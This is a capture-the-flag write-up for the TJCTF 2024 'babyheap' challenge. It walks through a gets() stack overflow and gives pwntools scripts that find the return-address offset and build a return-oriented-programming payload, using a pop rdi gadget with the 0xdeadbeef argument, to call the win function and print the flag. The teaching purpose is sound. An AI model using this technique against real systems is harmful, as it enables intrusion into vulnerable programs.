babyheap#

This is a challenge from TJCTF 2024 called baby heap lets have a little peek.

We start with the classic overflow as their is no bounds checking


undefined8 main(void)

{
  char local_10 [8];
  gets(local_10);
  return 0;
}

We have the classic win function but requires 0xdeadbeef as a parameter to the win function.


void win(long param_1)

{
  char local_78 [104];
  FILE *local_10;
  
  local_10 = fopen("flag.txt","r");
  fgets(local_78,0x23,local_10);
  printf("%i\n",param_1);
  if (param_1 == 0xdeadbeef) {
    puts(local_78);
    fflush(stdout);
  }
  else {
    puts("Bad!");
  }
  return;
}

Ive fallen into this pitfall a few times, its important to remember that different architectures get arguments in different ways. “The caller uses registers to pass the first 6 arguments to the callee” (first is %rdi register) rather than parsing them on the stack with x86. So we will need a way to load deadbeefin rdi. Ghidra shows as a function called gadget1 with the following assembly.

So lets take a sidestep and just quickly automate calculating the offset and then comeback to building the payload. We can setup the program to crash and read the coredump to find out the offset required.

from pwn import *
from pwnlib.util.packing import p64
context.log_level = 'DEBUG'
elf=context.binary=ELF('./babyheap')

context(terminal=['tmux', 'splitw', '-h'])

payload = cyclic(30)
p = process(elf.path)
p.sendline(payload)
p.wait()
core = Coredump('./core')
print(core.rsp)
stack_contents = core.read(core.rsp, 16)
print(f"Memory at rsp: {stack_contents}")

first_four_bytes = stack_contents[:4]
first_four_chars = first_four_bytes.decode('ascii') 
offset = cyclic_find(first_four_chars)
print(f'Offset: {offset}')

For me I had to do a little tweaking as I expected the cyclic pattern to be in rsp in the core dump but it was at the addresses referenced by rsp. Either way it works and has an offset of 16.

So lets build the payload we need the following parts

    1. Padding do overwrite the return address
    1. The return address of the pop rdi gadget
    1. 0xdeadbeef
    1. The address of the win function.

We can see the payload staged here:

An important thing to note is that when we make the ret call and execute the jump to the gadget. The stack pointer decrements so its point at our deadbeef argument to pop off into RDI.

The final code look like such!

from pwn import *
from pwnlib.util.packing import p64
context.log_level = 'DEBUG'
elf=context.binary=ELF('./babyheap')

context(terminal=['tmux', 'splitw', '-h'])

io = gdb.debug('./babyheap', '''
    b *main+30
    continue
''')

payload = b'A' * 16 + p64(0x40117a) + p64(0xdeadbeef) + p64(elf.symbols["win"])

print(payload)

io.sendline(payload)
io.interactive()
